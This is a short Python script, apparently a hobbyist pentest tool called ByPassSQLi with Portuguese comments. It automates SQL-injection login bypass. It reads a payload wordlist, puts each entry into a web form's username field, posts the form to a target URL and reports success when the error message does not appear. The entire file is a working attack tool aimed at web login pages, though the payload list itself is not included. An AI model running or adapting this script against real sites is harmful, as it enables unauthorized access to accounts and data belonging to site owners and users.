import requests, argparse, json

# Definindo um arquivo de help para ser chamado quando o parâmetro "--help" for ativado
def show_help():
    with open("help.txt", "r") as file_help:
        help_text = file_help.read()
    print(help_text)

# Criando um banner
def banner():
    return """

 ___                         ___  ___  _    _ 
| . > _ _  ___  ___  ___ ___/ __>| . || |  | |
| . \| | || . \<_> |<_-<<_-<\__ \| | || |_ | |
|___/`_. ||  _/<___|/__//__/<___/`___\|___||_|
     <___'|_|                                 
                    v1.0 - @ySolis
"""

# Definindo os parâmetros que a ferramenta poderá usar
parser = argparse.ArgumentParser(prog=banner(), usage="python3 ByPassSQLi.py -t http://site.com/userinfo.php -wl payloadsSQLi.txt -e \"you must login\" -d \"username=^USER^&pass=teste\"")
parser.add_argument("-t,", type=str, required=True, action="store", dest="target", help="Insert the target complete | Inserir o destino completo")
parser.add_argument("-wl,", type=str, required=True, action="store", dest="wlinput", help="Choose a wordlist | Escolha uma lista de palavras")
parser.add_argument("-e,", type=str, required=True, action="store", dest="error", help="Report the error message | Informe a mensagem de erro")
parser.add_argument("-d,", type=str, required=True, action="store", dest="data", help="Enter form data | Insira os dados do formulário")

args = parser.parse_args()

# Lendo a wordlist
with open(args.wlinput) as file:
    wordlist = [line.strip() for line in file]

# Definindo as variáveis do site e dos dados do formulário
site = args.target
data = args.data.replace("&", "\",\"").replace("=", "\":\"")

# Centro da ferramenta, onde o site será testado por cada linha de payload
for login in wordlist:
    paramters = data.replace("^USER^", login)
    dataformat = "{\""+paramters+"\"}"
    datajson = json.loads(dataformat)
    r = requests.post(site, data = datajson, allow_redirects = False)
    if r.text == args.error:
        print("Deu errado, tente novamente!")
    else:
        print("SQLI Bypass feito com sucesso!", datajson)